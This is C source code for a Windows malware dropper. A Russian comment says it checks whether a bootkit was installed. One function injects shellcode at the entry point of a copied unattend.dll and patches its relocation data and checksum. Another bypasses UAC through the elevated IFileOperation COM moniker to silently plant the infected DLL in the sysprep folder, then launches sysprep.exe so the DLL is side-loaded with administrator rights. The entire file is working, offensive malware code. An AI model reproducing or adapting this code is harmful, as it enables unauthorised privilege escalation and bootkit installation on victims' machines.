#include "std_sc_x64.c"

#ifndef _WIN64

#include "std_sc_x32.c"

BOOLEAN dropper_infect_victim_dll(LPCWSTR lpcwFileName)
{
	BOOLEAN bRet = TRUE;
	uint32_t dwFileSize;
	char chBinary[MAX_PATH];
	HANDLE hSection;
    std_shellcode_data scData;
    char mappingName[12];
    uint8_t* pSc;
    uint32_t scSize;
    uint8_t* imageBase;
    uint32_t imageSize;
	int needRelocate;

    globalData.fnlstrcpynA(mappingName, utils_get_machine_guid(), RTL_NUMBER_OF(mappingName));

    if (globalData.sysInfo.isWow64) {
        imageBase = zmodule_load_sections(dropper64_bin, &imageSize, PAGE_READWRITE);
		needRelocate = FALSE;
        //bRet = (imageBase && pe_process_relocs(imageBase, (DWORD64)imageBase - PeGetImageBase(imageBase)));
    }
    else {
        imageBase = globalData.currentImageBase;
        imageSize = globalData.currentImageSize;
		needRelocate = TRUE;
    }

	if (bRet && utils_create_zmodule_mapping(mappingName, imageBase, imageSize, &hSection, needRelocate)) {
        uint8_t* pMap;

        bRet = FALSE;
        
        globalData.fnwsprintfA(chBinary, "%S", lpcwFileName);//_snprintf(chBinary, RTL_NUMBER_OF(chBinary)-1, "%S", lpcwFileName);
		pMap = utils_map_file(chBinary, FILE_ALL_ACCESS, FILE_FLAG_WRITE_THROUGH, PAGE_READWRITE, FILE_MAP_ALL_ACCESS, &dwFileSize);
		if (pMap != NULL) {
			PIMAGE_NT_HEADERS pNtHdr = PeImageNtHeader(pMap);
			if (pNtHdr) {
                uint8_t* pVictimEP;
				uint32_t HeaderSum, CheckSum;

                if (globalData.sysInfo.isWow64) {
                    pSc = std_sc_x64;
                    scSize = sizeof(std_sc_x64);
                    pVictimEP = pMap + RvaToOffset(pNtHdr, ((PIMAGE_NT_HEADERS64)pNtHdr)->OptionalHeader.AddressOfEntryPoint);
                }
                else {
                    pSc = std_sc_x32;
                    scSize = sizeof(std_sc_x32);
                    pVictimEP = pMap + RvaToOffset(pNtHdr, pNtHdr->OptionalHeader.AddressOfEntryPoint);
                }

                if (dropper_prepare_shellcode_data(imageBase, &scData, mappingName, "isyspf", 1, globalData.sysInfo.isWow64)) {
                    dropper_prepare_shellcode(pVictimEP, pSc, scSize, (const uint8_t*)&scData, sizeof(std_shellcode_data));

                    if (globalData.sysInfo.isWow64) {
                        ((PIMAGE_NT_HEADERS64)pNtHdr)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size = 0;
	    		        ((PIMAGE_NT_HEADERS64)pNtHdr)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress = 0;
                    }
                    else {
                        pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size = 0;
                        pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress = 0;
                    }

			        if (globalData.fnCheckSumMappedFile(pMap, dwFileSize, &HeaderSum, &CheckSum)) {
                        if (globalData.sysInfo.isWow64) {
				            ((PIMAGE_NT_HEADERS64)pNtHdr)->OptionalHeader.CheckSum = CheckSum;
                        }
                        else {
                            pNtHdr->OptionalHeader.CheckSum = CheckSum;
                        }

				        bRet = TRUE;
			        }
                }
			}

			globalData.fnFlushViewOfFile(pMap, dwFileSize);
			globalData.fnUnmapViewOfFile(pMap);
		}
	}

	return bRet;
}

#else

BOOLEAN dropper_infect_victim_dll(LPCWSTR lpcwFileName)
{
	BOOLEAN bRet = FALSE;
	uint32_t dwFileSize;
	CHAR chBinary[MAX_PATH];
	HANDLE hSection;
    std_shellcode_data scData;
    char mappingName[12];

    globalData.fnlstrcpynA(mappingName, utils_get_machine_guid(), RTL_NUMBER_OF(mappingName));

	if (utils_create_zmodule_mapping(mappingName, globalData.currentImageBase, globalData.currentImageSize, &hSection, TRUE)) {
        PVOID pMap;

		globalData.fnwsprintfA(chBinary, "%S", lpcwFileName);//_snprintf(chBinary, RTL_NUMBER_OF(chBinary)-1, "%S", lpcwFileName);
		pMap = utils_map_file(chBinary, FILE_ALL_ACCESS, FILE_FLAG_WRITE_THROUGH, PAGE_READWRITE, FILE_MAP_ALL_ACCESS, &dwFileSize);
		if (pMap) {
			PIMAGE_NT_HEADERS pNtHdr = PeImageNtHeader(pMap);
			if (pNtHdr) {
                uint8_t* pVictimEP = RtlOffsetToPointer(pMap, RvaToOffset(pNtHdr, pNtHdr->OptionalHeader.AddressOfEntryPoint));
				uint32_t HeaderSum, CheckSum;

                dropper_prepare_shellcode_data(globalData.currentImageBase, &scData, mappingName, "isyspf", 1, 0);
                dropper_prepare_shellcode(pVictimEP, std_sc_x64, sizeof(std_sc_x64), (const uint8_t*)&scData, sizeof(std_shellcode_data));

				pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size = 0;
				pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress = 0;

				if (globalData.fnCheckSumMappedFile(pMap, dwFileSize, &HeaderSum, &CheckSum)) {
					pNtHdr->OptionalHeader.CheckSum = CheckSum;

					bRet = TRUE;
				}
			}

			globalData.fnFlushViewOfFile(pMap, dwFileSize);
			globalData.fnUnmapViewOfFile(pMap);
		}
	}

	return bRet;
}

#endif

#define FAKE_DLL_NAME L"unattend.dll"

#define FOFX_REQUIREELEVATION        0x10000000  // User expects the elevation; don't show a dialog to confirm

EXTERN_C const IID IID_IFileOperation;
EXTERN_C const IID IID_IShellItem2;
EXTERN_C const CLSID CLSID_FileOperation;

typedef HRESULT (*FnSHCreateItemFromParsingName)(PCWSTR pszPath, IBindCtx* pbc, REFIID riid, void** ppv);
#ifndef _WIN64
typedef BOOL (*FnWow64DisableWow64FsRedirection)(PVOID *OldValue);
typedef BOOL (*FnWow64RevertWow64FsRedirection)(PVOID OldValue);
#endif // _WIN64


int dropper_install_with_com_elevation()
{
    int bResult = 0;
    HRESULT hResult;
    BIND_OPTS3 bo;
    IFileOperation* pFileOp = NULL;
    IShellItem* pSHISource = NULL;
    IShellItem* pSHIDestination = NULL;
    IShellItem* pSHIDelete = NULL;
    BOOL isOK;
    WCHAR wcSysDir[MAX_PATH];
    WCHAR wcSysprepDir[MAX_PATH];
    WCHAR wcTempFileName[MAX_PATH];
    WCHAR wcFakedll[MAX_PATH];
    int counter;
#ifndef _WIN64
    PVOID fsRedirOld;
#endif // _WIN64;

    DbgMsg(__FUNCDNAME__": Exploits is not applicable\n", globalData.fnGetLastError());
#ifndef _WIN64
    if (globalData.sysInfo.isWow64) {
        FnWow64DisableWow64FsRedirection fnWow64DisableWow64FsRedirection = (FnWow64DisableWow64FsRedirection)PeGetProcAddress((PVOID)utils_get_module_base_by_hash(KERNEL32_DLL_HASH), "Wow64DisableWow64FsRedirection", FALSE);

        if (globalData.fnWow64DisableWow64FsRedirection != NULL) {
            if (!globalData.fnWow64DisableWow64FsRedirection(&fsRedirOld)) {
                return 0;
            }
        }
    }
#endif // _WIN64

    globalData.fnGetTempPathW(MAX_PATH - 1, wcSysprepDir);
    globalData.fnGetTempFileNameW(wcSysprepDir, NULL, globalData.fnGetTickCount(), wcTempFileName);

    globalData.fnGetSystemDirectoryW(wcSysDir, MAX_PATH - 1);
    globalData.fnPathCombineW(wcFakedll, wcSysDir, FAKE_DLL_NAME);
    globalData.fnPathCombineW(wcSysprepDir, wcSysDir, L"sysprep");

    isOK = globalData.fnCopyFileW(wcFakedll, wcTempFileName, FALSE);

    if (isOK) {
        DbgMsg(__FUNCDNAME__": Victim DLL copied from %S to %S\n", wcFakedll, wcTempFileName);
        isOK = dropper_infect_victim_dll(wcTempFileName);
    }
    else {
        DbgMsg(__FUNCDNAME__": CopyFileW failed %d\n", globalData.fnGetLastError());
    }

    if (isOK) {
        if (SUCCEEDED(globalData.fnCoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE))) {
            __stosb((uint8_t*)&bo, 0, sizeof(bo));
            bo.cbStruct = sizeof(bo);
            bo.dwClassContext = CLSCTX_LOCAL_SERVER;			

            counter = 0;
            do {
                hResult = globalData.fnCoGetObject(L"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}", (BIND_OPTS*)&bo, &IID_IFileOperation, &pFileOp);
                if (hResult != 0x800704C7) {
                    break;
                }
            } while (1);

            if (SUCCEEDED(hResult)) {
                DWORD flags;
#ifdef _WIN64
                flags = CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_SERVER | CLSCTX_INPROC_HANDLER;
#else
                if (globalData.sysInfo.isWow64) {
                    flags = CLSCTX_LOCAL_SERVER;
                }
                else {
                    flags = CLSCTX_INPROC_SERVER | CLSCTX_INPROC_HANDLER | CLSCTX_LOCAL_SERVER;
                }
#endif // _WIN64
                hResult = globalData.fnCoCreateInstance(&CLSID_FileOperation, NULL, flags, &IID_IFileOperation, (PVOID*)&pFileOp);

                if (SUCCEEDED(hResult)) {
                    hResult = pFileOp->lpVtbl->SetOperationFlags(pFileOp, FOF_NOCONFIRMATION|FOF_SILENT|FOFX_SHOWELEVATIONPROMPT|FOFX_NOCOPYHOOKS|FOFX_REQUIREELEVATION);
                    if (FAILED(hResult)) {
                        hResult = pFileOp->lpVtbl->SetOperationFlags(pFileOp, FOF_NOCONFIRMATION|FOF_SILENT|FOFX_SHOWELEVATIONPROMPT|FOFX_NOCOPYHOOKS);
                    }

                    if (SUCCEEDED(hResult)) {
                        if (SUCCEEDED(globalData.fnSHCreateItemFromParsingName(wcTempFileName, NULL, &IID_IShellItem2, (PVOID*)&pSHISource)) &&
                            SUCCEEDED(globalData.fnSHCreateItemFromParsingName(wcSysprepDir, NULL, &IID_IShellItem2, (PVOID*)&pSHIDestination)) &&
                            SUCCEEDED(pFileOp->lpVtbl->CopyItem(pFileOp, pSHISource, pSHIDestination, FAKE_DLL_NAME, NULL)) &&
                            SUCCEEDED(pFileOp->lpVtbl->PerformOperations(pFileOp))) {
                                BOOL bAnyOperationAborted = TRUE;
                                SHELLEXECUTEINFOW shinfo;

                                for ( ; bAnyOperationAborted; ) {
                                    if (FAILED(pFileOp->lpVtbl->GetAnyOperationsAborted(pFileOp, &bAnyOperationAborted))) {
                                        break;
                                    }
                                }

                                __stosb((uint8_t*)&shinfo, 0, sizeof(SHELLEXECUTEINFOW));
                                globalData.fnPathCombineW(wcFakedll, wcSysprepDir, L"sysprep.exe");
                                shinfo.cbSize = sizeof(shinfo);
                                shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
                                shinfo.lpFile = wcFakedll;
                                shinfo.lpDirectory = wcSysprepDir;
                                shinfo.nShow = SW_SHOW;
                                for ( ; ; ) {
                                    if (!globalData.fnShellExecuteExW(&shinfo)) {
                                        if (globalData.fnGetLastError() != ERROR_CANCELLED) {
                                            break;
                                        }
                                    }
                                    else {
                                        bResult = 1;
                                        break;
                                    }
                                }

                                if (bResult) {
                                    bResult = 0;

                                    if (globalData.fnWaitForSingleObject(shinfo.hProcess, 70 * 1000) != WAIT_OBJECT_0) {
                                        globalData.fnTerminateProcess(shinfo.hProcess, 0);
                                    }
                                    globalData.fnCloseHandle(shinfo.hProcess);

                                    // Првоеряем, статус установки буткита по наличию маркера в глобальной памяти.
                                    if (*(uint64_t*)payloadInfo.payloadName == *(uint64_t*)globalData.gPayload) {
                                        //MessageBoxA(NULL, "OK", "OK", MB_OK);
                                        bResult = 1;
                                    }

                                    globalData.fnPathCombineW(wcFakedll, wcSysprepDir, FAKE_DLL_NAME);
                                    if (SUCCEEDED(globalData.fnSHCreateItemFromParsingName(wcFakedll, NULL, &IID_IShellItem2, &pSHIDelete))) {
                                        if (SUCCEEDED(pFileOp->lpVtbl->DeleteItem(pFileOp, pSHIDelete, NULL))) {
                                            pFileOp->lpVtbl->PerformOperations(pFileOp);
                                        }
                                    }
                                }

                                //MoveFileExW(wcFakedll, 0, MOVEFILE_DELAY_UNTIL_REBOOT);
                        }
                    }
                    if (pSHIDelete != NULL) {
                        pSHIDelete->lpVtbl->Release(pSHIDelete);
                    }
                    if (pSHIDestination != NULL) {
                        pSHIDestination->lpVtbl->Release(pSHIDestination);
                    }
                    if (pSHISource != NULL) {
                        pSHISource->lpVtbl->Release(pSHISource);
                    }
                    if (pFileOp != NULL) {
                        pFileOp->lpVtbl->Release(pFileOp);
                    }
                }
            }
            globalData.fnCoUninitialize();
        }
        globalData.fnDeleteFileW(wcTempFileName);
    }

#ifndef _WIN64
    if (globalData.sysInfo.isWow64) {
        FnWow64RevertWow64FsRedirection fnWow64RevertWow64FsRedirection = (FnWow64RevertWow64FsRedirection)PeGetProcAddress((PVOID)utils_get_module_base_by_hash(KERNEL32_DLL_HASH), "Wow64RevertWow64FsRedirection", FALSE);

        if (fnWow64RevertWow64FsRedirection != NULL) {
            fnWow64RevertWow64FsRedirection(fsRedirOld);
        }
    }                                    
#endif // _WIN64

    return bResult;
}